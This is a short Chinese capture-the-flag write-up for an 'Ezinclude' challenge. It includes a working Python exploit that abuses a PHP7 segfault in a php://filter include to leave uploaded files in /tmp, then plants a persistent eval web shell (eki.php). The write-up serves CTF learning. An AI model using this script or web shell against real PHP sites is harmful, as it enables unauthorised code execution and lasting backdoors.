# NPUCTF

## Ezinclude

刚开始貌似是个逻辑漏洞

随便填个东西，在Request里就可以看到hash，然后用那个当passwd即可

第二步include 

- 利用点 php7 segment fault 导致文件被保存在/tmp/phpXXXXXX下

爆破半天，发现有dir.php可以看/tmp目录下文件。。。。

网上找到一个脚本魔改了一下

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
import itertools
import time

charset = string.digits + string.letters

base_url = "http://6a1c86d0-5362-4d88-b33e-7514e488b64c.node3.buuoj.cn"


def upload_file_to_include(url, file_content):
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
    try:
        #print url
        response = requests.post(url, files=files,allow_redirects=False)
        #print response.text
    except Exception as e:
        print e


def generate_tmp_files():
    webshell_content = "<?php eval($_REQUEST['eki']);?>".encode(
        "base64").strip().encode("base64").strip().encode("base64").strip()
    #file_content = '<?php if(file_put_contents("/tmp/eki", base64_decode("%s"))){echo "flag";}?>' % (
    #    webshell_content)
    
    file_content =  "<?php eval($_REQUEST['eki']); file_put_contents('./eki.php',\"<?php eval(\$_REQUEST['eki']); echo 123;?>\"); echo eki;?>"# 为啥这样写是因为一开始蚁剑始终连不上....

    phpinfo_url = "%s/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd" % (
        base_url)
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url, file_content)
        time.sleep(0.5)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```

然后``GET /flflflflag.php?file=/tmp/phpXXXXXX`` 看到返回``eki``,shell``eki.php``就生成了
